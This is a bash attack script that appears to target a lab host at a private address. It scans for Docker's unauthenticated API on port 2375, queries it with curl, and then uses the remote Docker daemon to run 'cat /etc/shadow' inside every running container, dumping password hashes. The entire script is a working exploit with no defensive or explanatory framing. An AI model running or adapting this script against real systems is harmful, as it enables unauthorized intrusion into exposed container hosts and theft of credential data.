#!/bin/bash

TARGET="10.10.145.28"
PORT="2375"

# Step 1: Launch nmap scan for port 2375
echo "Scanning target $TARGET for port $PORT..."
OPEN_PORT=$(nmap -p $PORT $TARGET | grep "$PORT/tcp open")

if [[ -z $OPEN_PORT ]]; then
    echo "Port $PORT is not open on $TARGET. Exiting..."
    exit 1
fi

# Step 2: Curl the target if the port is open
echo "Port $PORT is open. Fetching Docker version..."
curl "http://$TARGET:$PORT/version"

# Step 3: Use the Docker command to list all running containers and capture their IDs
echo "Listing all running containers..."
CONTAINER_IDS=$(docker -H tcp://$TARGET:$PORT ps -q)

# Check if there are any running containers
if [[ -z $CONTAINER_IDS ]]; then
    echo "No running containers found. Exiting..."
    exit 0
fi

# For each running container, display its /etc/shadow file
for ID in $CONTAINER_IDS; do
    echo "Fetching /etc/shadow for container $ID..."
    docker -H tcp://$TARGET:$PORT exec $ID cat /etc/shadow
    echo "--------------------------------------"
done

echo "Finished!"
